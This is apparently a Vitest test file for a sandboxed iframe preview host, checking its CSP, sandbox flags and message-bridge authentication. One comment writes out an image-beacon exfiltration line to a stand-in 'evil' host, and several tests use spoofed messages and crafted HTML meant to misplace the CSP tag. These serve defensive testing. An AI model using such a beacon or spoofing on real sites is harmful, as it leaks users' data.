/**
 * PreviewPanelHost 契约测试（issue #328 的质量红线，#1146 增补媒体字节通道）：
 * - sandbox 属性恒为 "allow-scripts"，永不出现 allow-same-origin；
 * - 只认 event.source === iframe.contentWindow 且带面板 source 标记的消息
 *   （opaque origin 下 event.origin 恒为 "null"，不能用于鉴别）；
 * - 桥方法只读：listArtifacts / readArtifact / readArtifactBytes /
 *   getJobDetail（后两者 payload 逐字节相等 / 超限走错误响应）；
 * - ready → 下发 init（jobId + --pp-* 主题变量 + katex 资源 URL +
 *   capabilities 能力声明）；
 * - resize 高度钳制在 [120, 6000]；
 * - #989：宿主文档有 CSP nonce 时 bundle 脚本盖章，拦截探针报告后显示提示；
 * - #1146：面板 CSP 放行 media-src blob:（img-src 不放行 blob:）。
 */
import { describe, it, expect, vi, beforeEach } from 'vitest'
import { render, act, waitFor } from '@testing-library/react'
import type { ReactElement } from 'react'
import { PreviewPanelHost } from './PreviewPanelHost'
import { PREVIEW_HOST_SOURCE, PREVIEW_PANEL_SOURCE } from './bridge'
import { makeJobDetail } from '../../testing/jobDetailFixtures'
import { TestQueryProvider } from '../../testing/testQueryClient'

const mockFetchJobArtifact = vi.fn()
const mockFetchJobDetail = vi.fn()
const mockFetchJobArtifactRawBytes = vi.fn()

vi.mock('../../api', () => ({
  fetchJobArtifact: (...args: unknown[]) => mockFetchJobArtifact(...args),
  fetchJobDetail: (...args: unknown[]) => mockFetchJobDetail(...args),
  fetchJobArtifactRawBytes: (...args: unknown[]) =>
    mockFetchJobArtifactRawBytes(...args),
}))

const BUNDLE = '<!doctype html><html><body>panel</body></html>'

function renderHost(ui?: ReactElement) {
  return render(ui ?? <PreviewPanelHost jobId="job-1" html={BUNDLE} />, {
    wrapper: TestQueryProvider,
  })
}

function getIframe(container: HTMLElement): HTMLIFrameElement {
  const iframe = container.querySelector('iframe')
  if (!iframe) throw new Error('iframe not rendered')
  return iframe
}

/** 冲刷异步更新（react-query 解析 + jsdom 的 iframe load 事件）进 act。 */
async function flush() {
  await act(async () => {
    await new Promise((resolve) => setTimeout(resolve, 20))
  })
}

/**
 * 等待桥端点登记（#1178 codex 复审 P1）：宿主只在 iframe **首帧 load** 时把
 * contentWindow 登记为桥端点（jsdom 对 srcdoc 异步 fire load）；发桥消息前
 * 必须等它完成，否则 bridgeWindowRef 尚为 null、消息被鉴别层丢弃——生产
 * 语义一致（面板脚本只在其文档 load 后才运行）。
 */
async function bridgeReady() {
  await flush()
}

/** 以面板身份向宿主派发消息（jsdom 的 MessageEvent 支持 source 字段）。 */
function emitPanelMessage(iframe: HTMLIFrameElement, data: unknown) {
  const event = new MessageEvent('message', {
    data,
    source: iframe.contentWindow,
  })
  act(() => {
    window.dispatchEvent(event)
  })
}

function hostReplies(
  iframe: HTMLIFrameElement
): Array<Record<string, unknown>> {
  const spy = vi.mocked(iframe.contentWindow!.postMessage)
  return spy.mock.calls
    .map((call) => call[0] as Record<string, unknown>)
    .filter((data) => data.source === PREVIEW_HOST_SOURCE)
}

beforeEach(() => {
  mockFetchJobArtifact.mockReset()
  mockFetchJobDetail.mockReset()
  mockFetchJobArtifactRawBytes.mockReset()
  mockFetchJobDetail.mockResolvedValue(
    makeJobDetail([], { artifacts: ['questions.json', 'notes.md'] })
  )
})

describe('PreviewPanelHost 沙箱红线', () => {
  it('sandbox 恒为 allow-scripts，永不授 allow-same-origin', async () => {
    const { container } = renderHost()
    const iframe = getIframe(container)

    expect(iframe.getAttribute('sandbox')).toBe('allow-scripts')
    expect(iframe.getAttribute('sandbox')).not.toContain('allow-same-origin')
    await flush()
  })

  it('srcDoc 注入宿主 CSP：策略含绝对平台 origin、无无效的 self、img 收敛到 data:/平台 origin（codex P1 + 评审加固 + #500）', async () => {
    const { container } = renderHost()
    const srcdoc = getIframe(container).getAttribute('srcdoc') ?? ''

    const metaMatch = srcdoc.match(
      /<meta http-equiv="Content-Security-Policy" content="([^"]*)">/
    )
    expect(metaMatch).not.toBeNull()
    const policy = metaMatch![1]
    expect(policy).toContain("default-src 'none'")
    expect(policy).toContain(`connect-src ${window.location.origin}`)
    expect(policy).toContain(
      `script-src 'unsafe-inline' ${window.location.origin}`
    )
    expect(policy).toContain(
      `style-src 'unsafe-inline' ${window.location.origin}`
    )
    expect(policy).toContain(`font-src ${window.location.origin}`)
    // 'self' 在 opaque origin 下不匹配任何 URL（CSP3）——出现即说明回退
    // 到了无效写法，平台 katex 资产会被误断。
    expect(policy).not.toContain("'self'")
    // img（#500 P1-4）：收敛到 data: 内联 + 平台 origin。任意 https 图源
    // 是 `new Image().src='https://evil/?d='+leak` 式零门槛 GET 外带通道，
    // 不得放行；data: 保留（单文件 bundle 内联图），blob: 无实际引用面
    // 不放行。
    expect(policy).toContain(`img-src data: ${window.location.origin}`)
    expect(policy).not.toContain('https:')
    // media（#1146）：只放行面板自建 blob（readArtifactBytes 字节 →
    // URL.createObjectURL 喂 <video>/<audio>）；blob 归面板本帧命名空间，
    // 不是出站面，故无需 origin 白名单。img-src 不得因此连带放行 blob:。
    expect(policy).toContain('media-src blob:')
    expect(policy).toContain("form-action 'none'")
    // bundle 原文完整保留在注入结果里。
    expect(srcdoc).toContain('<body>panel</body>')
    await flush()
  })

  it('CSP meta 落进真实 <head>：注释/字符串/属性里的伪 <head> 抢占不了落点（评审 P0）', async () => {
    const adversarial = [
      // 注释里的伪 <head>：正则定位会把 meta 注进注释内部。
      '<!doctype html><!-- <head> --><html><head><title>t</title></head><body>panel</body></html>',
      // JS 字符串字面量里的伪 <head>。
      '<!doctype html><html><script>var s = "<head>"</script><head><title>t</title></head><body>panel</body></html>',
      // 属性值里的伪 <head>。
      '<!doctype html><html data-x="<head>"><head><title>t</title></head><body>panel</body></html>',
    ]
    for (const html of adversarial) {
      const { container } = render(
        <PreviewPanelHost jobId="job-1" html={html} />,
        {
          wrapper: TestQueryProvider,
        }
      )
      const srcdoc = getIframe(container).getAttribute('srcdoc') ?? ''
      // 解析器语义定位：meta 必须在真实 head 内（title 之前），
      // 且不能落入注释/脚本/属性（那些位置序列化后不构成 meta 元素）。
      const headMatch = srcdoc.match(/<head>([\s\S]*?)<\/head>/)
      expect(headMatch).not.toBeNull()
      expect(headMatch![1]).toContain('Content-Security-Policy')
      expect(headMatch![1]).toContain('<title>t</title>')
      // 整个文档恰好一个 CSP meta（伪 head 场景下旧实现会出现 0 个）。
      expect(srcdoc.match(/Content-Security-Policy/g)).toHaveLength(1)
      await flush()
    }
  })

  it('无 <head> 的 bundle 也能注入 CSP（解析器隐式建 head）', async () => {
    const { container } = render(
      <PreviewPanelHost
        jobId="job-1"
        html="<!doctype html><html><body>headless</body></html>"
      />,
      { wrapper: TestQueryProvider }
    )
    const srcdoc = getIframe(container).getAttribute('srcdoc') ?? ''

    expect(srcdoc).toMatch(/<head><meta http-equiv="Content-Security-Policy"/)
    expect(srcdoc).toContain('<body>headless</body>')
    await flush()
  })
})

describe('PreviewPanelHost 桥协议', () => {
  it('ready 后向面板下发 init（jobId + 主题变量 + 资源）', async () => {
    const { container } = renderHost()
    const iframe = getIframe(container)
    const postSpy = vi.spyOn(iframe.contentWindow!, 'postMessage')
    await bridgeReady()

    emitPanelMessage(iframe, { source: PREVIEW_PANEL_SOURCE, type: 'ready' })

    await waitFor(() => expect(postSpy).toHaveBeenCalled())
    const init = postSpy.mock.calls
      .map((call) => call[0] as Record<string, unknown>)
      .find((data) => data.type === 'init')
    expect(init).toBeDefined()
    expect(init!.source).toBe(PREVIEW_HOST_SOURCE)
    expect(init!.jobId).toBe('job-1')
    expect(init!.theme).toMatchObject({ '--pp-bg': expect.any(String) })
    expect((init!.assets as Record<string, string>).katexJsUrl).toContain(
      'katex'
    )
    // #1146：init 带能力声明，面板据此对 readArtifactBytes 同步分支。
    expect(init!.capabilities).toEqual(['readArtifactBytes'])
  })

  it('listArtifacts 返回 job detail 的产物清单', async () => {
    const { container } = renderHost()
    const iframe = getIframe(container)
    vi.spyOn(iframe.contentWindow!, 'postMessage')
    emitPanelMessage(iframe, { source: PREVIEW_PANEL_SOURCE, type: 'ready' })
    await waitFor(() => expect(mockFetchJobDetail).toHaveBeenCalled())
    // 等 detail 真正落进宿主状态再发桥请求：called 只保证查询已发起，
    // 慢环境下快照可能还没就位（CI shard 时序曾命中，payload 为 null）。
    await flush()

    emitPanelMessage(iframe, {
      source: PREVIEW_PANEL_SOURCE,
      type: 'request',
      id: 7,
      method: 'listArtifacts',
    })

    await waitFor(() => {
      const reply = hostReplies(iframe).find(
        (data) => data.type === 'response' && data.id === 7
      )
      expect(reply).toMatchObject({
        ok: true,
        payload: ['questions.json', 'notes.md'],
      })
    })
  })

  it('readArtifact 走现有产物 API 并回传内容', async () => {
    mockFetchJobArtifact.mockResolvedValue({
      name: 'a.json',
      content: '{"x":1}',
    })
    const { container } = renderHost()
    const iframe = getIframe(container)
    vi.spyOn(iframe.contentWindow!, 'postMessage')
    await bridgeReady()

    emitPanelMessage(iframe, {
      source: PREVIEW_PANEL_SOURCE,
      type: 'request',
      id: 9,
      method: 'readArtifact',
      params: { name: 'a.json' },
    })

    await waitFor(() => {
      const reply = hostReplies(iframe).find(
        (data) => data.type === 'response' && data.id === 9
      )
      expect(reply).toMatchObject({
        ok: true,
        payload: { name: 'a.json', content: '{"x":1}' },
      })
    })
    expect(mockFetchJobArtifact).toHaveBeenCalledWith('job-1', 'a.json')
  })

  it('readArtifactBytes 走 init 下发的 MessagePort：字节经 port 回传 ArrayBuffer（逐字节相等，#1178 P1 port 方案）', async () => {
    // jsdom 的 port postMessage 执行真实 structured clone + transfer：源
    // buffer 发送后 detach——期望值用普通数组快照（与 buffer 生命周期解耦）。
    const expected = [0, 1, 2, 250, 251, 252]
    const mediaBytes = Uint8Array.from(expected).buffer
    mockFetchJobArtifactRawBytes.mockResolvedValue({
      name: 'demo.mp4',
      mediaType: 'video/mp4',
      bytes: mediaBytes,
    })
    const { container } = renderHost()
    const iframe = getIframe(container)
    const postSpy = vi.spyOn(iframe.contentWindow!, 'postMessage')
    await bridgeReady()
    emitPanelMessage(iframe, { source: PREVIEW_PANEL_SOURCE, type: 'ready' })

    // ready → init 携带 port2（transfer 第三参）。
    await waitFor(() => {
      const initCall = (postSpy.mock.calls as unknown[][]).find(
        ([data]) => (data as Record<string, unknown>)?.type === 'init'
      )
      expect(initCall).toBeDefined()
      const transfer = initCall![2] as unknown[]
      expect(transfer[0]).toBeInstanceOf(MessagePort)
    })
    const initCall = (postSpy.mock.calls as unknown[][]).find(
      ([data]) => (data as Record<string, unknown>)?.type === 'init'
    )!
    const panelPort = (initCall[2] as unknown[])[0] as MessagePort

    // 面板从 port 发 request（port 通道无 source 标记——身份由端口持有证明）。
    const portMessages: Array<Record<string, unknown>> = []
    panelPort.onmessage = (event: MessageEvent) => {
      portMessages.push(event.data as Record<string, unknown>)
    }
    panelPort.postMessage({
      type: 'request',
      id: 31,
      method: 'readArtifactBytes',
      params: { name: 'demo.mp4' },
    })
    // jsdom 的 MessagePort 投递是异步任务，flush 后可观测。
    await waitFor(() => {
      const reply = portMessages.find(
        (data) => data.type === 'response' && data.id === 31
      )
      expect(reply).toMatchObject({
        ok: true,
        payload: { name: 'demo.mp4', mediaType: 'video/mp4' },
      })
    })
    expect(mockFetchJobArtifactRawBytes).toHaveBeenCalledWith(
      'job-1',
      'demo.mp4'
    )
    const reply = portMessages.find(
      (data) => data.type === 'response' && data.id === 31
    )!
    const bytes = (reply.payload as { bytes: ArrayBuffer }).bytes
    // jsdom 的 port postMessage 执行真实 structured clone（含 transfer
    // 语义）：收方拿到的是克隆形态——形态断言宽松（ArrayBuffer 或
    // TypedArray），内容逐字节等价是硬断言。
    expect(bytes).toBeDefined()
    expect(Array.from(new Uint8Array(bytes))).toEqual(expected)
  })

  it('readArtifactBytes 的 bytes 经 port postMessage transfer 零拷贝转移（评审 P3-3 + #1178 port 方案）', async () => {
    const mediaBytes = Uint8Array.from([3, 1, 4, 1, 5]).buffer
    mockFetchJobArtifactRawBytes.mockResolvedValue({
      name: 'demo.mp4',
      mediaType: 'video/mp4',
      bytes: mediaBytes,
    })
    const { container } = renderHost()
    const iframe = getIframe(container)
    const postSpy = vi.spyOn(iframe.contentWindow!, 'postMessage')
    await bridgeReady()
    emitPanelMessage(iframe, { source: PREVIEW_PANEL_SOURCE, type: 'ready' })

    const initCall = (postSpy.mock.calls as unknown[][]).find(
      ([data]) => (data as Record<string, unknown>)?.type === 'init'
    )!
    const panelPort = (initCall[2] as unknown[])[0] as MessagePort
    const portPostSpy = vi.spyOn(panelPort, 'postMessage')
    panelPort.postMessage({
      type: 'request',
      id: 36,
      method: 'readArtifactBytes',
      params: { name: 'demo.mp4' },
    })
    await waitFor(() => {
      const call = (portPostSpy.mock.calls as unknown[][]).find(
        ([data]) => (data as Record<string, unknown>)?.id === 36
      )
      expect(call).toBeDefined()
    })
  })

  it('窗口通道的 readArtifactBytes 被拒并引导到 port（#1178 P1：高危方法只走 port，旧 window 形态拿到明确错误）', async () => {
    const { container } = renderHost()
    const iframe = getIframe(container)
    vi.spyOn(iframe.contentWindow!, 'postMessage')
    await bridgeReady()
    emitPanelMessage(iframe, { source: PREVIEW_PANEL_SOURCE, type: 'ready' })
    await flush()

    emitPanelMessage(iframe, {
      source: PREVIEW_PANEL_SOURCE,
      type: 'request',
      id: 46,
      method: 'readArtifactBytes',
      params: { name: 'demo.mp4' },
    })
    await waitFor(() => {
      const reply = hostReplies(iframe).find(
        (data) => data.type === 'response' && data.id === 46
      )
      expect(reply).toMatchObject({ ok: false })
      expect((reply!.error as string) || '').toContain('MessagePort')
    })
    // 高危方法不再走 fetch（字节不外发）。
    expect(mockFetchJobArtifactRawBytes).not.toHaveBeenCalled()
  })

  it('导航后窗口伪造的 readArtifactBytes 只能走 window 通道 → 被拒；port 随初始文档销毁不可复用（#1178 codex 复审 P1 port 语义）', async () => {
    mockFetchJobArtifactRawBytes.mockResolvedValue({
      name: 'demo.mp4',
      mediaType: 'video/mp4',
      bytes: Uint8Array.from([9, 9]).buffer,
    })
    const { container } = renderHost()
    const iframe = getIframe(container)
    const postSpy = vi.spyOn(iframe.contentWindow!, 'postMessage')
    await bridgeReady()
    emitPanelMessage(iframe, { source: PREVIEW_PANEL_SOURCE, type: 'ready' })

    // 首帧：port 通道往返成立（合法面板路径）。
    const initCall = (postSpy.mock.calls as unknown[][]).find(
      ([data]) => (data as Record<string, unknown>)?.type === 'init'
    )!
    const panelPort = (initCall[2] as unknown[])[0] as MessagePort
    const portMessages: Array<Record<string, unknown>> = []
    panelPort.onmessage = (event: MessageEvent) => {
      portMessages.push(event.data as Record<string, unknown>)
    }
    panelPort.postMessage({
      type: 'request',
      id: 41,
      method: 'readArtifactBytes',
      params: { name: 'demo.mp4' },
    })
    await waitFor(() => {
      expect(
        portMessages.find((data) => data.type === 'response' && data.id === 41)
      ).toMatchObject({ ok: true })
    })

    // 面板自导航（外部文档）：port 已随初始文档的销毁语义失效（浏览器中
    // 初始 global 销毁即关闭端口——jsdom 无法模拟 global 销毁，这里钉住
    // 攻击者拿不到第二个 port：init 只发一次、transfer 是一次性的）。导航
    // 后的文档用同一 WindowProxy 伪造面板标记走 **window 通道**发高危
    // request——被宿主拒绝（window 通道对 readArtifactBytes 恒拒）。
    emitPanelMessage(iframe, {
      source: PREVIEW_PANEL_SOURCE,
      type: 'request',
      id: 42,
      method: 'readArtifactBytes',
      params: { name: 'demo.mp4' },
    })
    await flush()
    const reply42 = hostReplies(iframe).find(
      (data) => data.type === 'response' && data.id === 42
    )
    expect(reply42).toMatchObject({ ok: false })
    // fetch 不被再次触发：字节只在首帧 port 路径发生过一次。
    expect(mockFetchJobArtifactRawBytes).toHaveBeenCalledTimes(1)
  })

  it('readArtifactBytes 超限与缺 name 走 port 错误响应通道（不回传半读字节，#1178 port 方案）', async () => {
    mockFetchJobArtifactRawBytes.mockRejectedValue(
      new Error(
        'artifact bytes 536870913 exceed readArtifactBytes limit 536870912'
      )
    )
    const { container } = renderHost()
    const iframe = getIframe(container)
    const postSpy = vi.spyOn(iframe.contentWindow!, 'postMessage')
    await bridgeReady()
    emitPanelMessage(iframe, { source: PREVIEW_PANEL_SOURCE, type: 'ready' })

    const initCall = (postSpy.mock.calls as unknown[][]).find(
      ([data]) => (data as Record<string, unknown>)?.type === 'init'
    )!
    const panelPort = (initCall[2] as unknown[])[0] as MessagePort
    const portMessages: Array<Record<string, unknown>> = []
    panelPort.onmessage = (event: MessageEvent) => {
      portMessages.push(event.data as Record<string, unknown>)
    }

    panelPort.postMessage({
      type: 'request',
      id: 33,
      method: 'readArtifactBytes',
      params: { name: 'big.mp4' },
    })
    panelPort.postMessage({
      type: 'request',
      id: 34,
      method: 'readArtifactBytes',
      params: {},
    })

    await waitFor(() => {
      const overLimit = portMessages.find(
        (data) => data.type === 'response' && data.id === 33
      )
      expect(overLimit).toMatchObject({ ok: false })
      expect(String(overLimit!.error)).toContain(
        'exceed readArtifactBytes limit'
      )
      expect(overLimit!.payload).toBeUndefined()
    })
    await waitFor(() => {
      const missing = portMessages.find(
        (data) => data.type === 'response' && data.id === 34
      )
      expect(missing).toMatchObject({ ok: false })
      expect(String(missing!.error)).toContain('params.name')
    })
  })

  it('readArtifact 缺 name 与未知方法回结构化错误', async () => {
    const { container } = renderHost()
    const iframe = getIframe(container)
    vi.spyOn(iframe.contentWindow!, 'postMessage')
    await bridgeReady()

    emitPanelMessage(iframe, {
      source: PREVIEW_PANEL_SOURCE,
      type: 'request',
      id: 11,
      method: 'readArtifact',
      params: {},
    })
    // 未知方法过不了 isPanelToHostMessage 守卫：宿主完全不响应。
    emitPanelMessage(iframe, {
      source: PREVIEW_PANEL_SOURCE,
      type: 'request',
      id: 12,
      method: 'deleteJob',
    })

    await waitFor(() => {
      const reply = hostReplies(iframe).find(
        (data) => data.type === 'response' && data.id === 11
      )
      expect(reply).toMatchObject({ ok: false })
      expect(String(reply!.error)).toContain('params.name')
    })
    expect(
      hostReplies(iframe).find(
        (data) => data.type === 'response' && data.id === 12
      )
    ).toBeUndefined()
  })

  it('getJobDetail 回传共享 detail 查询的快照', async () => {
    const { container } = renderHost()
    const iframe = getIframe(container)
    vi.spyOn(iframe.contentWindow!, 'postMessage')
    emitPanelMessage(iframe, { source: PREVIEW_PANEL_SOURCE, type: 'ready' })
    await waitFor(() => expect(mockFetchJobDetail).toHaveBeenCalled())
    // 同 listArtifacts 用例：等 detail 落进宿主状态，否则 getJobDetail
    // 可能拿到 null 快照（CI shard 时序实测命中）。
    await flush()

    emitPanelMessage(iframe, {
      source: PREVIEW_PANEL_SOURCE,
      type: 'request',
      id: 21,
      method: 'getJobDetail',
    })

    await waitFor(() => {
      const reply = hostReplies(iframe).find(
        (data) => data.type === 'response' && data.id === 21
      )
      expect(reply).toMatchObject({ ok: true })
      expect((reply!.payload as { artifacts: string[] }).artifacts).toEqual([
        'questions.json',
        'notes.md',
      ])
    })
    await flush()
  })

  it('忽略 source 不符或标记不符的消息', async () => {
    const { container } = renderHost()
    const iframe = getIframe(container)
    const postSpy = vi.spyOn(iframe.contentWindow!, 'postMessage')
    await flush()

    // 正确 source 但缺面板标记
    emitPanelMessage(iframe, {
      source: 'evil',
      type: 'request',
      id: 1,
      method: 'listArtifacts',
    })
    // 面板标记但不是 iframe 的 contentWindow（来源窗口不符）
    act(() => {
      window.dispatchEvent(
        new MessageEvent('message', {
          data: {
            source: PREVIEW_PANEL_SOURCE,
            type: 'request',
            id: 2,
            method: 'listArtifacts',
          },
          source: window,
        })
      )
    })

    await flush()
    expect(hostReplies(iframe)).toEqual([])
    expect(postSpy).not.toHaveBeenCalled()
  })

  it('resize 钳制高度在 [120, 6000]', async () => {
    const { container } = renderHost()
    const iframe = getIframe(container)
    await flush()

    emitPanelMessage(iframe, {
      source: PREVIEW_PANEL_SOURCE,
      type: 'resize',
      height: 40,
    })
    expect(iframe.style.height).toBe('120px')
    emitPanelMessage(iframe, {
      source: PREVIEW_PANEL_SOURCE,
      type: 'resize',
      height: 99999,
    })
    expect(iframe.style.height).toBe('6000px')
    emitPanelMessage(iframe, {
      source: PREVIEW_PANEL_SOURCE,
      type: 'resize',
      height: 432.6,
    })
    expect(iframe.style.height).toBe('433px')
  })
})

describe('PreviewPanelHost 宿主 CSP nonce（#989）', () => {
  function withHostNonce(nonce: string) {
    const meta = document.createElement('meta')
    meta.setAttribute('property', 'csp-nonce')
    meta.setAttribute('nonce', nonce)
    document.head.appendChild(meta)
    return () => meta.remove()
  }

  it('宿主文档带 nonce 时 bundle 的 <script> 盖同一 nonce', async () => {
    const cleanup = withHostNonce('host-nonce-1')
    try {
      const { container } = renderHost(
        <PreviewPanelHost
          jobId="job-1"
          html="<!doctype html><html><head><script>var a=1</script></head><body>p</body></html>"
        />
      )
      const srcdoc = getIframe(container).getAttribute('srcdoc') ?? ''
      expect(srcdoc).toContain('<script nonce="host-nonce-1">var a=1</script>')
      await flush()
    } finally {
      cleanup()
    }
  })

  it('csp-violation 探针消息 → 显示拦截提示；伪造来源不触发', async () => {
    const { container, queryByRole } = renderHost()
    const iframe = getIframe(container)
    await flush()

    act(() => {
      window.dispatchEvent(
        new MessageEvent('message', {
          data: {
            source: PREVIEW_PANEL_SOURCE,
            type: 'csp-violation',
            directive: 'script-src-attr',
          },
          source: window,
        })
      )
    })
    expect(queryByRole('status')).toBeNull()

    emitPanelMessage(iframe, {
      source: PREVIEW_PANEL_SOURCE,
      type: 'csp-violation',
      directive: 'script-src-attr',
    })
    expect(queryByRole('status')?.textContent).toContain(
      '全局设置 → 实例设置 → 安全'
    )
  })
})
